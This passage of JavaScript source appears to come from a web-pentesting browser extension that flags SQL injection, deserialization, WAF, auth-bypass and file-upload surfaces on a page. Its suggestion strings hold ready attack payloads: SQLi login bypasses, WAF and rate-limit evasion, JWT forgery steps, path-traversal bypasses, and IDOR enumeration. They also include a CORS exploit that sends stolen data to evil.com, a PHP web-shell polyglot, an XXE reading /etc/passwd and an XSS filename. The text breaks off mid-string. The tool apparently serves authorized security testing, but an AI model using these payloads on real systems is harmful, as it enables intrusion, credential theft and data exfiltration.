        suggestion: "Use ysoserial to generate exploitation payloads"
      });
    }

    // .NET ViewState
    const viewstate = document.querySelector('[name="__VIEWSTATE"]');
    if (viewstate && viewstate.value) {
      findings.push({
        type: ".NET ViewState",
        severity: "high",
        detail: `ViewState found (${viewstate.value.length} chars). If MAC validation is disabled, RCE is possible`,
        location: "Form field __VIEWSTATE",
        category: "deserialization",
        suggestion: "Test with ysoserial.net — check if ViewState MAC validation is enabled"
      });
    }

    // PHP serialized objects
    if (/[OaCsSi]:\d+:/.test(html) || /[OaCsSi]:\d+:/.test(cookies)) {
      findings.push({
        type: "PHP Serialized Object",
        severity: "high",
        detail: "PHP serialization pattern detected — test for object injection / POP chains",
        location: "Page or cookies",
        category: "deserialization"
      });
    }

    // Base64 encoded data in parameters (may contain serialized objects)
    const url = new URL(ctx.url);
    for (const [key, value] of url.searchParams) {
      if (value.length > 20 && isBase64(value)) {
        findings.push({
          type: "Base64 Parameter",
          severity: "medium",
          detail: `Parameter "${key}" contains base64 data — may wrap serialized objects`,
          location: ctx.url,
          category: "deserialization",
          suggestion: "Decode and inspect. If serialized data, test for insecure deserialization"
        });
      }
    }

    return findings;
  }

  function detectSQLInjection(ctx) {
    const findings = [];
    const url = ctx.url;
    const parsed = new URL(url);
    const params = [...parsed.searchParams.entries()];
    const html = ctx.html.slice(0, 150000);

    // ── 1. URL parameters likely used in SQL queries ──
    const sqliParams = [
      "id", "uid", "userid", "user_id", "pid", "product_id", "item_id",
      "cat", "category", "catid", "category_id",
      "pageid", "page_id", "article_id", "post_id", "news_id",
      "order", "orderby", "order_by", "sort", "sortby", "sort_by",
      "filter", "where", "column", "field", "col", "table",
      "limit", "offset", "count",
      "price", "min_price", "max_price", "amount",
      "parent_id", "child_id", "group_id",
      "report_id", "org_id",
      "project_id", "task_id", "ticket_id",
      "invoice_id", "payment_id", "transaction",
    ];

    for (const [key, value] of params) {
      const lk = key.toLowerCase();

      // Skip known OAuth/OIDC/PKCE parameters
      if (OAUTH_PARAMS.has(lk)) continue;

      // Flag SQL-common parameter names
      if (sqliParams.includes(lk)) {
        // Numeric IDs are the highest value targets
        const isNumeric = /^\d+$/.test(value);
        findings.push({
          type: "SQLi — Injectable Parameter",
          severity: isNumeric ? "high" : "medium",
          detail: `Parameter "${key}"=${truncate(value, 60)} is commonly used in SQL queries${isNumeric ? " (numeric — classic SQLi target)" : ""}`,
          location: url,
          category: "sqli",
          suggestion: isNumeric
            ? `Test: ${key}=${value}'  |  ${key}=${value} OR 1=1  |  ${key}=${value} UNION SELECT NULL--  |  ${key}=${value} AND SLEEP(5)--`
            : `Test: ${key}=${value}'  |  ${key}=${value}' OR '1'='1  |  ${key}=${value}' UNION SELECT NULL--  |  ${key}=${value}'; WAITFOR DELAY '0:0:5'--`
        });
      }

      // Detect values that already look like SQL fragments (error-based recon)
      if (/('|--|;|union\s|select\s|insert\s|update\s|delete\s|drop\s|alter\s|exec\s)/i.test(value)) {
        findings.push({
          type: "SQLi — SQL Syntax in Parameter",
          severity: "high",
          detail: `Parameter "${key}" contains SQL-like syntax: "${truncate(value, 80)}"`,
          location: url,
          category: "sqli",
          suggestion: "This parameter already carries SQL fragments — likely reaches a query. Test injection immediately."
        });
      }

      // Comma-separated numeric lists (IN clause targets)
      if (/^\d+(,\d+)+$/.test(value)) {
        findings.push({
          type: "SQLi — Numeric List (IN clause)",
          severity: "medium",
          detail: `Parameter "${key}" has comma-separated IDs: "${truncate(value, 60)}" — likely used in SQL IN(...)`,
          location: url,
          category: "sqli",
          suggestion: `Test: ${key}=${value}) OR 1=1--  |  Inject after any ID in the list`
        });
      }
    }

    // ── 2. SQL error messages in page source ──
    const sqlErrors = [
      { pattern: /SQL syntax.*?MySQL/i, db: "MySQL" },
      { pattern: /Warning.*?mysql_/i, db: "MySQL" },
      { pattern: /MySQLSyntaxErrorException/i, db: "MySQL" },
      { pattern: /valid MySQL result/i, db: "MySQL" },
      { pattern: /check the manual that corresponds to your (MySQL|MariaDB)/i, db: "MySQL/MariaDB" },
      { pattern: /PostgreSQL.*?ERROR/i, db: "PostgreSQL" },
      { pattern: /pg_query\(\)/i, db: "PostgreSQL" },
      { pattern: /pg_exec\(\)/i, db: "PostgreSQL" },
      { pattern: /PSQLException/i, db: "PostgreSQL" },
      { pattern: /unterminated quoted string at or near/i, db: "PostgreSQL" },
      { pattern: /ORA-\d{5}/i, db: "Oracle" },
      { pattern: /Oracle.*?Driver/i, db: "Oracle" },
      { pattern: /Microsoft OLE DB Provider for SQL Server/i, db: "MSSQL" },
      { pattern: /Unclosed quotation mark after the character string/i, db: "MSSQL" },
      { pattern: /mssql_query\(\)/i, db: "MSSQL" },
      { pattern: /Microsoft SQL Native Client error/i, db: "MSSQL" },
      { pattern: /SQLServerException/i, db: "MSSQL" },
      { pattern: /SQLite3?::SQLException/i, db: "SQLite" },
      { pattern: /SQLITE_ERROR/i, db: "SQLite" },
      { pattern: /near ".*?": syntax error/i, db: "SQLite" },
      { pattern: /unrecognized token:/i, db: "SQLite" },
      { pattern: /com\.mysql\.jdbc/i, db: "MySQL (JDBC)" },
      { pattern: /org\.postgresql\.util\.PSQLException/i, db: "PostgreSQL (JDBC)" },
      { pattern: /SQLSTATE\[/i, db: "PDO (PHP)" },
      { pattern: /Syntax error or access violation/i, db: "Generic SQL" },
      { pattern: /You have an error in your SQL syntax/i, db: "MySQL" },
      { pattern: /quoted string not properly terminated/i, db: "Oracle" },
      { pattern: /SQL command not properly ended/i, db: "Oracle" },
      { pattern: /supplied argument is not a valid MySQL/i, db: "MySQL" },
      { pattern: /javax\.persistence/i, db: "JPA/Hibernate" },
      { pattern: /org\.hibernate\.exception/i, db: "Hibernate" },
    ];

    for (const { pattern, db } of sqlErrors) {
      if (pattern.test(html)) {
        findings.push({
          type: "SQLi — Database Error Exposed",
          severity: "critical",
          detail: `${db} error message found in page source — confirms SQL query interaction and poor error handling`,
          location: "Page source",
          category: "sqli",
          suggestion: `Database identified as ${db}. The error leakage confirms injectable surface. Use ${db}-specific payloads and attempt error-based or UNION-based extraction.`
        });
        break; // one error disclosure finding is enough
      }
    }

    // ── 3. Database technology markers ──
    const dbMarkers = [
      { pattern: /phpMyAdmin/i, db: "phpMyAdmin (MySQL admin panel)", sev: "high" },
      { pattern: /phppgadmin/i, db: "phpPgAdmin (PostgreSQL admin panel)", sev: "high" },
      { pattern: /adminer\.php/i, db: "Adminer (DB admin tool)", sev: "high" },
      { pattern: /\.mdb\b|\.accdb\b/i, db: "Microsoft Access database file reference", sev: "medium" },
      { pattern: /\.sqlite\b|\.db\b|\.sqlite3\b/i, db: "SQLite database file reference", sev: "medium" },
      { pattern: /jdbc:/i, db: "JDBC connection string", sev: "high" },
      { pattern: /mongodb:\/\//i, db: "MongoDB connection string (NoSQLi vector)", sev: "high" },
      { pattern: /redis:\/\//i, db: "Redis connection string", sev: "high" },
    ];

    for (const { pattern, db, sev } of dbMarkers) {
      if (pattern.test(html)) {
        findings.push({
          type: "SQLi — Database Exposure",
          severity: sev,
          detail: `${db} detected in page source`,
          location: "Page source",
          category: "sqli",
          suggestion: "Investigate this endpoint for direct database interaction or admin panel access."
        });
      }
    }

    // ── 4. Forms with search / filter / login patterns ──
    const forms = ctx.forms;
    forms.forEach((form, i) => {
      const action = form.getAttribute("action") || "";
      const inputs = [...form.querySelectorAll("input, textarea, select")];
      const inputNames = inputs.map(el => (el.name || el.id || "").toLowerCase()).filter(Boolean);

      const sqliInputNames = inputNames.filter(n =>
        /^(search|q|query|keyword|id|user|username|login|email|pass|password|filter|sort|order|category|from|to|date|year|name|code|ref|num|phone|zip|city|state|country|address|title|content|comment|message|subject|tag|label)$/i.test(n)
      );

      if (sqliInputNames.length > 0) {
        // Check if it's a login form specifically
        const isLogin = inputNames.some(n => /^(user|username|login|email)$/i.test(n)) &&
                        inputNames.some(n => /^(pass|password|pwd)$/i.test(n));

        findings.push({
          type: isLogin ? "SQLi — Login Form" : "SQLi — Input Form",
          severity: isLogin ? "high" : "medium",
          detail: isLogin
            ? `Form #${i + 1} is a login form (fields: ${sqliInputNames.join(", ")}) — classic auth bypass target`
            : `Form #${i + 1} has query-like inputs: ${sqliInputNames.join(", ")}`,
          location: action || url,
          category: "sqli",
          suggestion: isLogin
            ? `SQLi login bypass payloads (from Rodolfo Assis / Brute Logic):\n• admin' --\n• ' OR 1=1 --\n• ' OR '1'='1' --\n• admin'/*\n• ') OR ('1'='1\n• ' OR 1=1#\n• ' OR 1=1/*\n• admin' OR '1'='1\n• admin') OR ('1'='1'--\n• ' UNION SELECT 1,'admin','password'--\n• ' OR ''='\n• '-'\n• ' OR 'x'='x\n• ') OR 1=1--\n• ' OR username IS NOT NULL--\n• 1' ORDER BY 1--+\n• '; WAITFOR DELAY '0:0:5'-- (time-based blind)\n• Username field: admin' --  Password field: anything\n• If WAF blocks: a]dm/**/in' --  |  'OR(1=1)--  |  'oR'1'='1\n• Try uppercase: ' OR 1=1 -- → ' oR 1=1 --`
            : `Test each field for injection: ' OR 1=1--  |  ' UNION SELECT NULL--  |  '; WAITFOR DELAY '0:0:5'--`
        });
      }
    });

    // ── 5. REST-style numeric IDs in URL path ──
    const pathParts = parsed.pathname.split("/").filter(Boolean);
    for (let i = 0; i < pathParts.length; i++) {
      if (/^\d+$/.test(pathParts[i]) && pathParts[i].length < 10) {
        const context = i > 0 ? pathParts[i - 1] : "root";
        findings.push({
          type: "SQLi — Numeric Path ID",
          severity: "medium",
          detail: `Path contains numeric ID: /${context}/${pathParts[i]} — may be used in SQL lookup`,
          location: url,
          category: "sqli",
          suggestion: `Test: /${context}/${pathParts[i]}'  |  /${context}/${pathParts[i]} OR 1=1--  |  /${context}/${pathParts[i]} UNION SELECT NULL--`
        });
      }
    }

    // ── 6. Inline JS with SQL-like string building ──
    const scripts = ctx.inlineScripts;
    let inlineJS = "";
    scripts.forEach(s => { inlineJS += s.textContent + "\n"; });
    inlineJS = inlineJS.slice(0, 100000);

    const sqlBuildPatterns = [
      { pattern: /["'`]SELECT\s+[\w*]+(?:\s*,\s*[\w*]+)*\s+FROM\s/i, name: "SELECT...FROM query" },
      { pattern: /["'`]INSERT\s+INTO\s+\w/i, name: "INSERT INTO query" },
      { pattern: /["'`]UPDATE\s+\w+\s+SET\s/i, name: "UPDATE...SET query" },
      { pattern: /["'`]DELETE\s+FROM\s+\w/i, name: "DELETE FROM query" },
      { pattern: /["'`]DROP\s+(?:TABLE|DATABASE|INDEX)\s/i, name: "DROP statement" },
      { pattern: /\+\s*['"].*?\b(WHERE|ORDER\s+BY|GROUP\s+BY|HAVING|UNION\s+SELECT|JOIN)\b/i, name: "string-concatenated SQL clause" },
    ];

    for (const { pattern, name } of sqlBuildPatterns) {
      if (pattern.test(inlineJS)) {
        findings.push({
          type: "SQLi — Client-Side SQL Construction",
          severity: "medium",
          detail: `${name} found in client-side JavaScript — if sent to backend, the query pattern may be injectable`,
          location: "Inline scripts",
          category: "sqli",
          suggestion: "Trace how this query reaches the server. If params are interpolated, test the corresponding API endpoint."
        });
      }
    }

    // P1/P5F: "SQLi — Injectable Cookie" removed. Cookies are DOMAIN-WIDE, so this fired once
    // per route (it appeared on 52/55 lab routes — the single worst cross-route bleed), and a
    // cookie merely being short/numeric is NOT evidence it reaches a SQL query. If a cookie
    // value actually surfaces in a SQL error, the SQL-error detector already catches that.

    // ── 8. Common ORM / query builder indicators ──
    const ormIndicators = [
      { pattern: /Sequelize/i, name: "Sequelize (Node.js ORM)", note: "Test for raw query fallback injection or operator injection [$gt, $like]" },
      { pattern: /ActiveRecord/i, name: "ActiveRecord (Rails ORM)", note: "Test for unsafe #find_by, #where with string interpolation" },
      { pattern: /Eloquent/i, name: "Eloquent (Laravel ORM)", note: "Test for whereRaw / DB::raw injection, mass assignment" },
      { pattern: /SQLAlchemy/i, name: "SQLAlchemy (Python ORM)", note: "Test for text() with string formatting injection" },
      { pattern: /Prisma/i, name: "Prisma (Node.js ORM)", note: "Test for raw query methods: $queryRaw, $executeRaw" },
      { pattern: /TypeORM/i, name: "TypeORM (Node.js ORM)", note: "Test for .query() and createQueryBuilder() raw injections" },
    ];

    for (const { pattern, name, note } of ormIndicators) {
      if (pattern.test(html) || pattern.test(inlineJS)) {
        findings.push({
          type: "SQLi — ORM Detected",
          severity: "info",
          detail: `${name} detected — ${note}`,
          location: "Page source",
          category: "sqli"
        });
      }
    }

    // ── 9. JSON / GraphQL body parameters (API-style SQLi) ──
    // Check for GraphQL (already detected, but add SQLi context)
    if (/graphql/i.test(html) || /graphiql/i.test(html)) {
      findings.push({
        type: "SQLi — GraphQL Endpoint",
        severity: "medium",
        detail: "GraphQL detected — resolvers may pass arguments directly into SQL queries",
        location: "Page source",
        category: "sqli",
        suggestion: "Test resolver arguments: query { user(id: \"1' OR 1=1--\") { name } }  |  Use introspection to discover all queryable fields"
      });
    }

    return findings;
  }

  // ── 11. WAF / Filter Detection ──

  function detectWAF(ctx) {
    const findings = [];
    const html = ctx.html.slice(0, 100000);
    const url = ctx.url;

    // WAF signatures in page source, error pages, headers
    const wafSignatures = [
      { pattern: /cloudflare/i, name: "Cloudflare", bypasses: [
        "Use Cloudflare origin IP discovery (CloudFail, CrimeFlare, Censys, Shodan)",
        "Smuggle via HTTP/2 downgrade or chunked transfer encoding",
        "Unicode normalization bypass: sele%c3%a7t → select",
        "Try alternate content-types: application/json, multipart/form-data",
        "Bypass via direct IP if origin is exposed in DNS history or subdomains"
      ]},
      { pattern: /akamai/i, name: "Akamai", bypasses: [
        "Parameter pollution: ?id=1&id=' OR 1=1--",
        "Path-based bypass: /path/;/admin or /path/%2e/admin",
        "Chunked transfer encoding to fragment payloads",
        "URL encoding layers: double/triple encode special chars",
        "Test edge cases: overlong UTF-8, null bytes"
      ]},
      { pattern: /aws[- ]?waf|awselb/i, name: "AWS WAF", bypasses: [
        "Case variation: SeLeCt, uNiOn",
        "Comment injection: UN/**/ION SE/**/LECT",
        "JSON body payloads (many rulesets only inspect query params)",
        "HTTP parameter pollution across multiple same-name params",
        "Chunk the request body across multiple TCP segments"
      ]},
      { pattern: /mod_security|modsecurity/i, name: "ModSecurity", bypasses: [
        "HPP: ?id=1/*&id=*/union/*&id=*/select",
        "Comment nesting: /*!50000 UNION*/ /*!50000 SELECT*/",
        "Overlong UTF-8 encoding: %c0%27 for single quote",
        "Null byte injection: %00' OR 1=1--",
        "Multipart Content-Type boundary manipulation"
      ]},
      { pattern: /sucuri/i, name: "Sucuri", bypasses: [
        "URL encoding: %55NION %53ELECT",
        "Case mixing: uNioN sElEcT",
        "Inline comments: /*!UNION*/ /*!SELECT*/",
        "Alternate whitespace: UNION%09SELECT, UNION%0bSELECT",
        "Test via direct origin IP (check DNS history, Censys)"
      ]},
      { pattern: /imperva|incapsula/i, name: "Imperva/Incapsula", bypasses: [
        "Use HTTP/2 header injection or pseudo-header smuggling",
        "JSON-based injection when API endpoints accept JSON bodies",
        "Alternate encodings: UTF-7, UTF-16",
        "Buffer overflow the WAF regex with very long parameter values",
        "Double URL-encode: %2527 → %27 → '"
      ]},
      { pattern: /f5|big-?ip|asm/i, name: "F5 BIG-IP ASM", bypasses: [
        "Parameter fragmentation across multipart boundaries",
        "HTTP request smuggling via CL.TE or TE.CL",
        "Bypass via internal hostname in Host header",
        "HPP to split payload across duplicate parameters",
        "Test with uncommon HTTP methods: PATCH, OPTIONS with body"
      ]},
      { pattern: /barracuda/i, name: "Barracuda WAF", bypasses: [
        "URL encoding + case variation: %53elect",
        "Tab/newline as whitespace: UNION%0aSELECT",
        "Path traversal with encoded dots: %2e%2e%2f",
        "Test via IPv6 if WAF only filters IPv4",
        "Inject via HTTP headers: X-Forwarded-For, Referer"
      ]},
      { pattern: /fortiweb|fortigate/i, name: "Fortinet FortiWeb", bypasses: [
        "Null byte insertion: sel%00ect",
        "Unicode normalization: ＇ (fullwidth apostrophe)",
        "HTTP verb tampering: use POST body with GET semantics",
        "Fragment payload across multiple cookies",
        "Use WebSocket upgrade to bypass HTTP inspection"
      ]},
      { pattern: /wordfence/i, name: "Wordfence (WordPress)", bypasses: [
        "Double encoding: %252f for /",
        "Comment-based splitting: UN/**/ION",
        "Bypass via wp-json REST API (often less filtered)",
        "Test xmlrpc.php — often not covered by WAF rules",
        "Path normalization: /wp-admin/./edit.php"
      ]},
      { pattern: /palo\s?alto|prisma\s?cloud/i, name: "Palo Alto", bypasses: [
        "HTTP/2 multiplexing to bypass inspection",
        "JSON body injection for API endpoints",
        "Unicode tricks: ﹴ, ﬁ, ﬆ ligatures in payloads",
        "Very large Content-Length to trigger bypass",
        "Chunk transfer encoding with padded sizes"
      ]},
      { pattern: /(__cf_bm|cf-ray|cf-cache|server.*cloudflare)/i, name: "Cloudflare (via headers)", bypasses: [] },
      { pattern: /x-sucuri-id/i, name: "Sucuri (via headers)", bypasses: [] },
    ];

    // P6: do NOT emit "WAF Detected" from a vendor NAME appearing in page source. A page that
    // merely mentions — or is fronted by — Cloudflare/Akamai/etc. is not evidence of an active
    // WAF affecting your testing, and this fired on nearly every route. Real WAF/CDN detection
    // is done in the service worker from actual RESPONSE HEADERS (cf-ray, x-sucuri-id, server),
    // and an actual block/challenge PAGE is still detected below from real block signals.
    void wafSignatures;

    // Generic WAF detection via common block responses
    const wafBlockPatterns = [
      /access denied/i, /request blocked/i, /forbidden/i,
      /security policy/i, /web application firewall/i,
      /suspicious activity/i, /your request has been blocked/i,
      /please verify you are human/i, /captcha/i
    ];

    let blockSignals = 0;
    for (const pat of wafBlockPatterns) {
      if (pat.test(html)) blockSignals++;
    }
    if (blockSignals >= 2) {
      findings.push({
        type: "WAF Block Page Detected",
        severity: "medium",
        detail: `Page contains ${blockSignals} WAF block indicators — payloads may be filtered`,
        location: "Page source",
        category: "waf-bypass",
        suggestion: "General WAF bypass techniques:\n• Encoding: URL, double-URL, Unicode, hex, base64\n• HTTP Parameter Pollution (HPP)\n• Chunked Transfer-Encoding\n• HTTP Request Smuggling (CL.TE / TE.CL)\n• Content-Type switching: form → JSON → XML → multipart\n• Case alternation and inline comments\n• Whitespace alternatives: %09 %0a %0b %0c %0d %a0\n• Null bytes: %00 between keywords\n• Overlong requests to exhaust WAF inspection buffer"
      });
    }

    // Rate limiting detection
    if (/rate.limit|too.many.requests|429|throttl/i.test(html)) {
      findings.push({
        type: "Rate Limiting Detected",
        severity: "info",
        detail: "Rate limiting or throttling markers found",
        location: "Page source",
        category: "waf-bypass",
        suggestion: "Bypass rate limits:\n• Rotate IP via proxy chains\n• Vary User-Agent per request\n• Add jitter/delay between requests\n• Use X-Forwarded-For / X-Real-IP spoofing\n• Try alternate API versions or endpoints\n• Change HTTP method (GET ↔ POST)"
      });
    }

    return findings;
  }

  // ── 12. Authentication & Access Bypass Indicators ──

  function detectAuthBypass(ctx) {
    const findings = [];
    const url = ctx.url;
    const html = ctx.html.slice(0, 100000);
    const parsed = new URL(url);

    // JWT detection
    const jwtPattern = /eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+/g;
    const jwtInPage = html.match(jwtPattern);
    const jwtInCookie = ctx.cookies.match(jwtPattern);
    const jwtInUrl = url.match(jwtPattern);

    if (jwtInPage || jwtInCookie || jwtInUrl) {
      const where = jwtInUrl ? "URL" : jwtInCookie ? "Cookie" : "Page source";
      findings.push({
        type: "Bypass — JWT Token Found",
        severity: "high",
        detail: `JWT token found in ${where} — test for auth bypass`,
        location: where,
        category: "auth-bypass",
        suggestion: "JWT bypass techniques:\n• Algorithm confusion: change alg to 'none', remove signature\n• Weak secret brute-force: hashcat/jwt_tool with rockyou.txt\n• Algorithm switch: RS256 → HS256 (use public key as HMAC secret)\n• kid injection: '../../../dev/null' or SQL injection in kid field\n• jku/x5u header injection: point to your JWK server\n• Modify claims: change role, user_id, is_admin\n• Expired token replay: some servers don't validate exp\n• JWS vs JWE confusion"
      });
    }

    // Session/auth cookies
    const cookies = ctx.cookies;
    const authCookiePatterns = [
      { pattern: /session/i, name: "Session cookie" },
      { pattern: /auth/i, name: "Auth cookie" },
      { pattern: /token/i, name: "Token cookie" },
      { pattern: /jwt/i, name: "JWT cookie" },
      { pattern: /access/i, name: "Access cookie" },
      { pattern: /role|admin|privilege|perm/i, name: "Role/privilege cookie" },
    ];

    for (const { pattern, name } of authCookiePatterns) {
      const cookieEntries = cookies.split(";").filter(c => pattern.test(c.split("=")[0]));
      for (const ce of cookieEntries) {
        const [cName] = ce.trim().split("=");
        if (/role|admin|privilege|perm|is_admin|isadmin|user_type|usertype|access_level/i.test(cName)) {
          findings.push({
            type: "Indicator — Authorization Cookie",
            severity: "info",
            detail: `Cookie "${cName.trim()}" may influence authorization (unverified). A cookie name alone is not a vulnerability — the server may ignore it entirely.`,
            location: "Cookies",
            category: "auth-bypass",
            suggestion: "To verify: replay a request with this cookie modified and compare the response. If the server returns privileged data/actions based on the changed cookie, it's a real finding; if the response is unchanged (or the value is server-signed), it is not."
          });
        }
      }
    }

    // Hidden admin/debug params
    const adminParams = ["admin", "debug", "test", "internal", "dev", "staging", "bypass",
      "is_admin", "role", "privilege", "access", "mode", "env", "verbose", "trace"];

    for (const [key] of parsed.searchParams) {
      if (adminParams.includes(key.toLowerCase())) {
        findings.push({
          type: "Bypass — Debug/Admin Parameter",
          severity: "high",
          detail: `Parameter "${key}" may toggle admin/debug mode`,
          location: url,
          category: "auth-bypass",
          suggestion: `Test: ${key}=true  |  ${key}=1  |  ${key}=admin  |  ${key}=yes  |  Remove or flip the value`
        });
      }
    }

    // Path-based access control bypass
    const protectedPaths = ["/admin", "/dashboard", "/panel", "/manage", "/settings",
      "/config", "/internal", "/debug", "/api/admin", "/console", "/portal"];
    const currentPath = parsed.pathname.toLowerCase();

    for (const pp of protectedPaths) {
      if (currentPath.startsWith(pp) || html.includes(`href="${pp}`) || html.includes(`href='${pp}`)) {
        findings.push({
          type: "Bypass — Protected Path",
          severity: "medium",
          detail: `Protected path "${pp}" referenced — test path-based access control bypass`,
          location: url,
          category: "auth-bypass",
          suggestion: `Path traversal bypass techniques:\n• ${pp} → ${pp}/ (trailing slash)\n• ${pp} → ${pp}%2f (encoded slash)\n• ${pp} → /${pp.slice(1)}/. (dot segment)\n• ${pp} → /;${pp.slice(1)} (semicolon)\n• ${pp} → ${pp}%00 (null byte)\n• ${pp} → ${pp}..;/ (Tomcat bypass)\n• ${pp} → ${pp}%23 (fragment trick)\n• ${pp} → /ADMIN (case variation)\n• X-Original-URL: ${pp} / X-Rewrite-URL: ${pp}\n• Host header: internal hostname\n• HTTP method override: X-HTTP-Method-Override: PUT/DELETE`
        });
        break;
      }
    }

    // CORS misconfig check
    if (html.includes("Access-Control-Allow-Origin: *") ||
        html.includes("access-control-allow-origin") ||
        /Access-Control-Allow-Credentials.*true/i.test(html)) {
      findings.push({
        type: "Bypass — CORS Misconfiguration",
        severity: "medium",
        detail: "CORS headers detected — test for overly permissive origin reflection",
        location: "Headers",
        category: "auth-bypass",
        suggestion: "CORS bypass techniques:\n• Origin reflection: Set Origin: https://evil.com — check if reflected in Access-Control-Allow-Origin\n• Null origin: Origin: null (via sandboxed iframe: <iframe sandbox='allow-scripts'> or data: URI)\n• Subdomain: Origin: https://anything.target.com (then find XSS on a subdomain)\n• Pre-domain: Origin: https://target.com.evil.com\n• Post-domain: Origin: https://evil.com.target.com\n• Special chars: Origin: https://target.com%60.evil.com (backtick)\n• Underscore: Origin: https://target.com_.evil.com\n• Trust regex bypass: Origin: https://nottarget.com | Origin: https://targetcom.evil.com\n• Wildcard + credentials: Access-Control-Allow-Origin:* with Access-Control-Allow-Credentials:true is a browser-blocked misconfig\n• Exploit:\n  fetch('https://target.com/api/user',{credentials:'include'})\n  .then(r=>r.json()).then(d=>fetch('https://evil.com/log?d='+JSON.stringify(d)))\n• Internal CORS: test from internal network (VPN, SSRF chain)"
      });
    }

    // IDOR indicators — expanded 15-minute methodology
    const idorParams = [...parsed.searchParams.entries()];
    const idorPatterns = /^(user_?id|uid|account_?id|profile_?id|customer_?id|member_?id|employee_?id|owner_?id|id|doc_?id|document_?id|order_?id|invoice_?id|file_?id|report_?id|record_?id|group_?id|org_?id|team_?id|project_?id|message_?id|thread_?id|comment_?id|ticket_?id|transaction_?id|payment_?id|subscription_?id|ref|reference|no|num|number|key|uuid|guid|slug|handle|token|code|hash)$/i;
    for (const [key, value] of idorParams) {
      if (idorPatterns.test(key)) {
        const isNumeric = /^\d+$/.test(value);
        const isUUID = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i.test(value);
        const isHash = /^[0-9a-f]{32,64}$/i.test(value);
        findings.push({
          type: "Bypass — IDOR (Insecure Direct Object Reference)",
          severity: "high",
          detail: `Parameter "${key}"=${truncate(value,40)} — ${isNumeric?"numeric ID: trivially enumerable":isUUID?"UUID: check for disclosure elsewhere":isHash?"hash-based: may be predictable":"test for access control bypass"}`,
          location: url,
          category: "auth-bypass",
          suggestion: `IDOR 15-minute methodology:\n1. Note your own ID: ${key}=${truncate(value,20)}\n2. Create 2nd account, get their ${key} value\n3. Replace ${key} with 2nd account's value → unauthorized access?\n4. Try without auth cookie entirely → unauthenticated access?\n5. Try HTTP method switch: GET↔POST↔PUT↔DELETE↔PATCH\n${isNumeric?`6. Enumerate: ${key}=${parseInt(value)-1}, ${parseInt(value)+1}, ${key}=0, ${key}=1\n7. Bulk: Burp Intruder 1-10000`:""}${isUUID?"6. Search for UUID leaks in: API responses, JS files, HTML source, other endpoints\n7. Try null UUID: 00000000-0000-0000-0000-000000000000":""}${isHash?"6. Check if hash is MD5/SHA1 of sequential ID: md5(1), md5(2)...\n7. Try common hashes: md5('admin'), md5('1')":""}\n• Wrap ID in array: ${key}[]=${value}\n• Add .json extension: /resource/${value}.json\n• Try GraphQL: query { user(id: OTHER_ID) { email } }\n• HPP: ${key}=${value}&${key}=OTHER_VALUE\n• Parameter pollution: swap GET↔POST body for same param`
        });
      }
    }
    // IDOR in path segments
    const pathParts = parsed.pathname.split("/").filter(Boolean);
    for (let i = 0; i < pathParts.length; i++) {
      const seg = pathParts[i];
      if (/^\d{1,10}$/.test(seg) && i > 0) {
        findings.push({
          type: "Bypass — IDOR (Path-based)",
          severity: "medium",
          detail: `Numeric path segment /${pathParts[i-1]}/${seg} — likely object ID in URL path`,
          location: url,
          category: "auth-bypass",
          suggestion: `Path-based IDOR: change /${seg} to other IDs\n• /${pathParts[i-1]}/${parseInt(seg)-1}\n• /${pathParts[i-1]}/${parseInt(seg)+1}\n• Test without authentication`
        });
        break;
      }
      if (/^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i.test(seg) && i > 0) {
        findings.push({
          type: "Bypass — IDOR (UUID in Path)",
          severity: "medium",
          detail: `UUID in path: /${pathParts[i-1]}/${seg} — find other UUIDs to test access control`,
          location: url, category: "auth-bypass"
        });
        break;
      }
    }

    return findings;
  }

  // ── 13. Upload Restriction Bypass ──

  function detectUploadBypass(ctx) {
    const findings = [];
    const fileInputs = document.querySelectorAll('input[type="file"]');
    const html = ctx.html.slice(0, 100000);

    fileInputs.forEach((input, i) => {
      const accept = input.getAttribute("accept") || "";
      const form = input.closest("form");
      const action = form ? (form.getAttribute("action") || "") : "";

      findings.push({
        type: "Bypass — File Upload Detected",
        severity: accept ? "high" : "medium",
        detail: `Upload #${i + 1}${accept ? " restricts to: " + accept + " — client-side validation is bypassable" : " — no accept restriction, test all file types"}`,
        location: action || ctx.url,
        category: "upload-bypass",
        suggestion: `⚡ Content-Type vs Extension mismatch testing:\n• Upload .php with Content-Type: image/jpeg → executes as PHP?\n• Upload .jpg with Content-Type: text/html → browser renders as HTML (stored XSS)?\n• Upload .svg with Content-Type: image/png → SVG with embedded JS executes?\n• Upload .html with Content-Type: application/octet-stream → renders as page?\n• Upload .shtml with Content-Type: image/gif → SSI execution?\n• If server trusts Content-Type over extension: upload shell with image Content-Type\n• If server trusts extension over Content-Type: use double extension shell.php.jpg\n\nUpload bypass techniques (from bug bounty books):\n• Remove accept attribute via DevTools and upload .php/.jsp/.aspx\n• Double extension: shell.php.jpg | shell.jpg.php | shell.php.png\n• Null byte: shell.php%00.jpg | shell.php\\x00.jpg (older systems)\n• Case variation: shell.pHp | shell.PhP5 | shell.aSPx\n• Alternate extensions:\n  PHP: .php5 .phtml .phar .shtml .phps .pht .php7\n  Java: .jsp .jspx .jsw .jsv .war\n  ASP: .aspx .asp .ashx .asmx .ascx .config\n  Python: .py .pyw  |  Ruby: .rb  |  Perl: .pl .cgi\n• Content-Type mismatch: upload .php with Content-Type: image/jpeg | image/gif | image/png\n• Magic bytes: GIF89a; | \\x89PNG\\r\\n | \\xFF\\xD8\\xFF\\xE0 (JPEG) prepended to shell\n• Polyglot JPEG: exiftool -Comment="<?php system(\\$_GET[c]); ?>" img.jpg && mv img.jpg img.php.jpg\n• .htaccess upload: AddType application/x-httpd-php .jpg\n• web.config: <handlers><add name="x" path="*.jpg" verb="*" type="System.Web.UI.PageHandlerFactory"/></handlers>\n• Race condition: upload → access before server deletes (use Burp Turbo Intruder)\n• Path traversal: filename="../../../var/www/html/shell.php"\n• Chunked transfer: split file across chunks\n• Overlong UTF-8: shell.p%c0%a8p\n• Content-Disposition tricks: filename="shell.php"; filename="shell.jpg"\n• SVG XXE: <svg><desc><!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]></desc></svg>\n• Archive slip: upload .zip/.tar with path traversal in archived filename\n• Zseano's bypasses:\n  CRLF in filename: shell.php\\r\\n.jpg\n  XSS in filename: <img src=x onerror=alert(1)>.jpg (stored XSS when filename rendered)\n  